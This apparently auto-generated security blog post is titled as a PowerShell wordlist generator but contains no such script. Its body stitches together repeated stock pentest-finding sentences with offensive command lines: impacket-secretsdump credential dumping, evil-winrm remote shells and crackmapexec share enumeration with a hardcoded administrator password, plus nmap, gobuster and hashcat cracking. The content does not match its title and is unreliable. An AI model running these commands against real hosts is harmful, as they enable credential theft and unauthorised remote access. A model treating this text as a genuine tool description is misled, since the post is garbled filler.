---
TitleSEO: "Custom Wordlist Generator in PowerShell | ZureFX"
TitlePost: "Custom Wordlist Generator — PowerShell"
Author: "ZureFX"
Description: "A PowerShell script for custom wordlist generator. Built for security research and automation."
Keywords: "c, bash, rust, tool, scanner, fuzzer, powershell"
URL: "https://zurefx.github.io/scripting/script-custom-wordlist-generator-970.html"
URL_IMAGES: ""
Date: "2025-12-23"
Tags: "C, Bash, Rust, Tool, Scanner, Fuzzer, PowerShell"
Section: "scripting"
Lang: "en"
main_img: "script-custom-wordlist-generator-970"
Permalink: "/scripting/script-custom-wordlist-generator-970.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

The database credentials were hardcoded in the application source code. Command injection was possible through unsanitized user input in the search functionality. The web application was vulnerable to Server-Side Template Injection (SSTI).

Built with **PowerShell** for offensive security automation.

### Requirements

- PowerShell
- `rpcclient`
- `feroxbuster`
- `hashcat`

## Implementation

### Core Logic

Token impersonation allowed elevation to SYSTEM privileges on the target. Privilege escalation was possible due to misconfigured sudo permissions.

```powershell
impacket-secretsdump administrator:'P@ssw0rd!'@10.86.133.135
gobuster dir -u http://10.57.141.150/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
feroxbuster -h
```

Command injection was possible through unsanitized user input in the search functionality. The scheduled task ran with elevated privileges and could be abused for escalation.

### Helper Functions

The service was running without proper input validation, leading to injection vulnerabilities. Network traffic analysis revealed unencrypted communications containing user credentials.

```powershell
evil-winrm -i 10.40.84.231 -u administrator -p 'P@ssw0rd!'
nmap -sCV -p22,5432,1433 10.54.52.135 -oN scan.txt
crackmapexec smb 10.78.224.168 -u administrator -p 'P@ssw0rd!' --shares
```

## Usage

### Basic Usage

Unconstrained delegation was enabled on the compromised machine. The service account had excessive permissions assigned in Active Directory.

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

### Advanced Options

The backup files contained sensitive information that should not have been accessible. The service account had excessive permissions assigned in Active Directory. The service account had excessive permissions assigned in Active Directory.

```bash
evil-winrm -i 10.52.7.165 -u administrator -p 'P@ssw0rd!'
evil-winrm -i 10.25.7.145 -u administrator -p 'P@ssw0rd!'
nmap -sCV -p5432,139,389 10.120.1.9 -oN scan.txt
```

## Output

### Example Output

Post-exploitation enumeration revealed a path to domain administrator privileges. Group Policy Preferences contained encrypted but recoverable credentials.

```
[+] Scanning target...
[+] Found 12 results
[+] Done in 20.64s
```
